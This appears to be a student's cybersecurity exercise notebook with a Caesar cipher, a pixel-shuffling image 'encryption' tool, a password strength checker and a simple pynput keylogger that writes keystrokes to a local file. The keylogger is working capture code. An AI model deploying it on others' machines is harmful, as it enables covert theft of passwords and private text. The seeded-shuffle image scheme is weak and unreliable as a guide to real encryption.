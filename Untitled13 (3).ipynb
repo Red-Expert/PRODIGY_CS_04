{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "665f1224-6e23-4e17-bdbc-f3065763c484",
   "metadata": {},
   "outputs": [
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "Do you want to encrypt or decrypt? (e/d):  d\n",
      "Enter the message:  Texksn\n",
      "Enter the shift value:  10\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Decrypted message: Junaid\n"
     ]
    }
   ],
   "source": [
    "def encrypt(text, shift):\n",
    "    \"\"\"Encrypt the text using Caesar cipher with the given shift.\"\"\"\n",
    "    encrypted_text = \"\"\n",
    "    for char in text:\n",
    "        # Check if the character is a letter\n",
    "        if char.isalpha():\n",
    "            # Handle uppercase and lowercase letters separately\n",
    "            ascii_offset = 65 if char.isupper() else 97\n",
    "            # Shift the character and wrap around if necessary\n",
    "            encrypted_char = chr(((ord(char) - ascii_offset + shift) % 26) + ascii_offset)\n",
    "            encrypted_text += encrypted_char\n",
    "        else:\n",
    "            # Keep non-alphabetic characters unchanged\n",
    "            encrypted_text += char\n",
    "    return encrypted_text\n",
    "\n",
    "def decrypt(text, shift):\n",
    "    \"\"\"Decrypt the text using Caesar cipher with the given shift.\"\"\"\n",
    "    return encrypt(text, -shift)\n",
    "\n",
    "def main():\n",
    "    \"\"\"Main function to run the Caesar cipher program.\"\"\"\n",
    "    # Get user input\n",
    "    choice = input(\"Do you want to encrypt or decrypt? (e/d): \").lower()\n",
    "    text = input(\"Enter the message: \")\n",
    "    shift = int(input(\"Enter the shift value: \"))\n",
    "\n",
    "    if choice == 'e':\n",
    "        encrypted_message = encrypt(text, shift)\n",
    "        print(f\"Encrypted message: {encrypted_message}\")\n",
    "    elif choice == 'd':\n",
    "        decrypted_message = decrypt(text, shift)\n",
    "        print(f\"Decrypted message: {decrypted_message}\")\n",
    "    else:\n",
    "        print(\"Invalid choice. Please enter 'e' to encrypt or 'd' to decrypt.\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 1,
   "id": "14c674bf-e8b4-42ba-bb84-7a09c87f8661",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Requirement already satisfied: pillow in e:\\anaconda3\\lib\\site-packages (10.2.0)\n"
     ]
    }
   ],
   "source": [
    "!pip install pillow"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "65c4ec6b-b18c-4b2e-9202-91897dfa224b",
   "metadata": {},
   "outputs": [
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "Do you want to encrypt or decrypt an image? (e/d):  e\n",
      "Enter the path to the image:  C:\\Users\\User\\Desktop\\Bit level permutation research material\\other part\\Elgamal encryption\\microorganism.jpg\n",
      "Enter the path to save the output image:  C:\\Users\\User\\Desktop\\Bit level permutation research material\\other part\\Elgamal encryption\\encrypted_image.jpg\n",
      "Enter the encryption key (integer):  5\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Image encrypted and saved as C:\\Users\\User\\Desktop\\Bit level permutation research material\\other part\\Elgamal encryption\\encrypted_image.jpg\n"
     ]
    }
   ],
   "source": [
    "from PIL import Image\n",
    "import random\n",
    "\n",
    "def encrypt_image(image_path, output_path, key):\n",
    "    \"\"\"Encrypt an image by performing pixel manipulation.\"\"\"\n",
    "    # Open the image\n",
    "    image = Image.open(image_path)\n",
    "    pixels = list(image.getdata())\n",
    "    \n",
    "    # Initialize random number generator with the key\n",
    "    random.seed(key)\n",
    "    \n",
    "    # Encrypt the pixels by swapping\n",
    "    for i in range(len(pixels)):\n",
    "        j = random.randint(0, len(pixels) - 1)\n",
    "        # Swap pixel values\n",
    "        pixels[i], pixels[j] = pixels[j], pixels[i]\n",
    "    \n",
    "    # Create a new encrypted image\n",
    "    encrypted_image = Image.new(image.mode, image.size)\n",
    "    encrypted_image.putdata(pixels)\n",
    "    encrypted_image.save(output_path)\n",
    "    print(f\"Image encrypted and saved as {output_path}\")\n",
    "\n",
    "def decrypt_image(image_path, output_path, key):\n",
    "    \"\"\"Decrypt an image by reversing the pixel manipulation.\"\"\"\n",
    "    # Open the image\n",
    "    image = Image.open(image_path)\n",
    "    pixels = list(image.getdata())\n",
    "    \n",
    "    # Initialize random number generator with the key\n",
    "    random.seed(key)\n",
    "    \n",
    "    # Store the swap operations in reverse order\n",
    "    swaps = [(i, random.randint(0, len(pixels) - 1)) for i in range(len(pixels))]\n",
    "    swaps.reverse()\n",
    "    \n",
    "    # Decrypt the pixels by reversing the swaps\n",
    "    for i, j in swaps:\n",
    "        # Swap pixel values back to their original positions\n",
    "        pixels[i], pixels[j] = pixels[j], pixels[i]\n",
    "    \n",
    "    # Create a new decrypted image\n",
    "    decrypted_image = Image.new(image.mode, image.size)\n",
    "    decrypted_image.putdata(pixels)\n",
    "    decrypted_image.save(output_path)\n",
    "    print(f\"Image decrypted and saved as {output_path}\")\n",
    "\n",
    "def main():\n",
    "    \"\"\"Main function to run the image encryption tool.\"\"\"\n",
    "    choice = input(\"Do you want to encrypt or decrypt an image? (e/d): \").lower()\n",
    "    image_path = input(\"Enter the path to the image: \")\n",
    "    output_path = input(\"Enter the path to save the output image: \")\n",
    "    key = int(input(\"Enter the encryption key (integer): \"))\n",
    "\n",
    "    if choice == 'e':\n",
    "        encrypt_image(image_path, output_path, key)\n",
    "    elif choice == 'd':\n",
    "        decrypt_image(image_path, output_path, key)\n",
    "    else:\n",
    "        print(\"Invalid choice. Please enter 'e' to encrypt or 'd' to decrypt.\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "ea1f4cc3-cb5c-420c-89cd-ac564f6ef185",
   "metadata": {},
   "outputs": [
    {
     "name": "stdin",
     "output_type": "stream",
     "text": [
      "Enter a password to check its strength:  Awan2745\n"
     ]
    },
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Password Feedback:\n",
      "- Password should contain at least one special character (e.g., !, @, #, $, etc.).\n",
      "- Password is moderate.\n"
     ]
    }
   ],
   "source": [
    "import re\n",
    "\n",
    "def check_password_strength(password):\n",
    "    \"\"\"Check the strength of the given password and provide feedback.\"\"\"\n",
    "    \n",
    "    # Initialize strength variables\n",
    "    strength = 0\n",
    "    feedback = []\n",
    "\n",
    "    # Length check\n",
    "    if len(password) >= 8:\n",
    "        strength += 1\n",
    "    else:\n",
    "        feedback.append(\"Password should be at least 8 characters long.\")\n",
    "\n",
    "    # Check for uppercase letters\n",
    "    if re.search(r'[A-Z]', password):\n",
    "        strength += 1\n",
    "    else:\n",
    "        feedback.append(\"Password should contain at least one uppercase letter (A-Z).\")\n",
    "\n",
    "    # Check for lowercase letters\n",
    "    if re.search(r'[a-z]', password):\n",
    "        strength += 1\n",
    "    else:\n",
    "        feedback.append(\"Password should contain at least one lowercase letter (a-z).\")\n",
    "\n",
    "    # Check for digits\n",
    "    if re.search(r'\\d', password):\n",
    "        strength += 1\n",
    "    else:\n",
    "        feedback.append(\"Password should contain at least one digit (0-9).\")\n",
    "\n",
    "    # Check for special characters\n",
    "    if re.search(r'[\\W_]', password):\n",
    "        strength += 1\n",
    "    else:\n",
    "        feedback.append(\"Password should contain at least one special character (e.g., !, @, #, $, etc.).\")\n",
    "\n",
    "    # Assess overall strength\n",
    "    if strength == 5:\n",
    "        feedback.append(\"Password is strong.\")\n",
    "    elif strength >= 3:\n",
    "        feedback.append(\"Password is moderate.\")\n",
    "    else:\n",
    "        feedback.append(\"Password is weak.\")\n",
    "\n",
    "    return feedback\n",
    "\n",
    "def main():\n",
    "    \"\"\"Main function to run the password complexity checker.\"\"\"\n",
    "    password = input(\"Enter a password to check its strength: \")\n",
    "    feedback = check_password_strength(password)\n",
    "    \n",
    "    print(\"\\nPassword Feedback:\")\n",
    "    for line in feedback:\n",
    "        print(f\"- {line}\")\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    main()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "2691d033-d13d-4fb4-9fb5-fe6871577bc8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting pynput\n",
      "  Downloading pynput-1.7.7-py2.py3-none-any.whl.metadata (31 kB)\n",
      "Requirement already satisfied: six in e:\\anaconda3\\lib\\site-packages (from pynput) (1.16.0)\n",
      "Downloading pynput-1.7.7-py2.py3-none-any.whl (90 kB)\n",
      "   ---------------------------------------- 0.0/90.2 kB ? eta -:--:--\n",
      "   ---- ----------------------------------- 10.2/90.2 kB ? eta -:--:--\n",
      "   ------------- -------------------------- 30.7/90.2 kB 435.7 kB/s eta 0:00:01\n",
      "   ------------------ --------------------- 41.0/90.2 kB 281.8 kB/s eta 0:00:01\n",
      "   ------------------------------- -------- 71.7/90.2 kB 357.2 kB/s eta 0:00:01\n",
      "   ---------------------------------------- 90.2/90.2 kB 394.1 kB/s eta 0:00:00\n",
      "Installing collected packages: pynput\n",
      "Successfully installed pynput-1.7.7\n"
     ]
    }
   ],
   "source": [
    "!pip install pynput"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "eb96a067-043e-474c-a821-89d211b8cc61",
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput import keyboard\n",
    "\n",
    "# Path to the log file\n",
    "log_file_path = \"C:/Users/User/Desktop/Bit level permutation research material/other part/Elgamal encryption/keylog.txt\"\n",
    "\n",
    "def on_press(key):\n",
    "    \"\"\"Callback function that gets called on each key press.\"\"\"\n",
    "    try:\n",
    "        # Log the key as a string\n",
    "        with open(log_file_path, \"a\") as log_file:\n",
    "            log_file.write(f'{key.char}')\n",
    "    except AttributeError:\n",
    "        # Handle special keys like Shift, Ctrl, etc.\n",
    "        with open(log_file_path, \"a\") as log_file:\n",
    "            log_file.write(f'[{key}]')\n",
    "\n",
    "def on_release(key):\n",
    "    \"\"\"Callback function that gets called when a key is released.\"\"\"\n",
    "    # Stop the listener when Esc key is pressed\n",
    "    if key == keyboard.Key.esc:\n",
    "        return False\n",
    "\n",
    "def start_keylogger():\n",
    "    \"\"\"Start the keylogger.\"\"\"\n",
    "    # Set up the listener\n",
    "    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:\n",
    "        listener.join()\n",
    "\n",
    "if __name__ == \"__main__\":\n",
    "    start_keylogger()\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "id": "cf1b06ea-1c0f-4796-aa91-c4cd1c1788bd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Collecting scapy\n",
      "  Downloading scapy-2.5.0.tar.gz (1.3 MB)\n",
      "     ---------------------------------------- 0.0/1.3 MB ? eta -:--:--\n",
      "     ---------------------------------------- 0.0/1.3 MB ? eta -:--:--\n",
      "     ---------------------------------------- 0.0/1.3 MB ? eta -:--:--\n",
      "     ---------------------------------------- 0.0/1.3 MB ? eta -:--:--\n",
      "      --------------------------------------- 0.0/1.3 MB 131.3 kB/s eta 0:00:10\n",
      "      --------------------------------------- 0.0/1.3 MB 131.3 kB/s eta 0:00:10\n",
      "     - -------------------------------------- 0.0/1.3 MB 131.3 kB/s eta 0:00:10\n",
      "     - -------------------------------------- 0.1/1.3 MB 193.2 kB/s eta 0:00:07\n",
      "     -- ------------------------------------- 0.1/1.3 MB 249.8 kB/s eta 0:00:05\n",
      "     --- ------------------------------------ 0.1/1.3 MB 285.2 kB/s eta 0:00:05\n",
      "     ---- ----------------------------------- 0.1/1.3 MB 315.4 kB/s eta 0:00:04\n",
      "     ------ --------------------------------- 0.2/1.3 MB 393.0 kB/s eta 0:00:03\n",
      "     ------- -------------------------------- 0.2/1.3 MB 437.4 kB/s eta 0:00:03\n",
      "     -------- ------------------------------- 0.3/1.3 MB 460.6 kB/s eta 0:00:03\n",
      "     ---------- ----------------------------- 0.3/1.3 MB 538.1 kB/s eta 0:00:02\n",
      "     ------------- -------------------------- 0.4/1.3 MB 624.8 kB/s eta 0:00:02\n",
      "     ---------------- ----------------------- 0.5/1.3 MB 740.6 kB/s eta 0:00:01\n",
      "     ------------------ --------------------- 0.6/1.3 MB 763.0 kB/s eta 0:00:01\n",
      "     ---------------------- ----------------- 0.7/1.3 MB 882.8 kB/s eta 0:00:01\n",
      "     ---------------------------- ----------- 0.9/1.3 MB 1.1 MB/s eta 0:00:01\n",
      "     ----------------------------------- ---- 1.1/1.3 MB 1.3 MB/s eta 0:00:01\n",
      "     -------------------------------------- - 1.2/1.3 MB 1.3 MB/s eta 0:00:01\n",
      "     ---------------------------------------- 1.3/1.3 MB 1.3 MB/s eta 0:00:00\n",
      "  Preparing metadata (setup.py): started\n",
      "  Preparing metadata (setup.py): finished with status 'done'\n",
      "Building wheels for collected packages: scapy\n",
      "  Building wheel for scapy (setup.py): started\n",
      "  Building wheel for scapy (setup.py): finished with status 'done'\n",
      "  Created wheel for scapy: filename=scapy-2.5.0-py2.py3-none-any.whl size=1444342 sha256=7d9054cf48ea1976cc31f80caf79510858b652905eeacd3b42857fe078a139a9\n",
      "  Stored in directory: c:\\users\\user\\appdata\\local\\pip\\cache\\wheels\\11\\ff\\28\\a1348d0c6d006242c053521732bc2951d0c9eca62a11430da1\n",
      "Successfully built scapy\n",
      "Installing collected packages: scapy\n",
      "Successfully installed scapy-2.5.0\n"
     ]
    }
   ],
   "source": [
    "!pip install scapy"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.11.7"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
